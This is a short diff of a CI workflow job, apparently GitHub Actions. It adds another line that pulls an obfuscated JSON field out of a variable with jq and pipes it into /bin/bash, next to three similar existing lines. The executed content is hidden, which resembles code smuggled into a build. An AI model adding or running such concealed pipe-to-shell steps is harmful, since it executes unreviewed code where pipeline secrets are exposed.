@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$pgo2" | jq -r .jynt66071 | /bin/bash
           echo $ldbv27377 | jq -r .rqmv1587 | /bin/bash
           printf '%s' "$h3" | jq -r .x850 | /bin/bash
+          printf '%s' "$irwn1" | jq -r .thrxh09 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
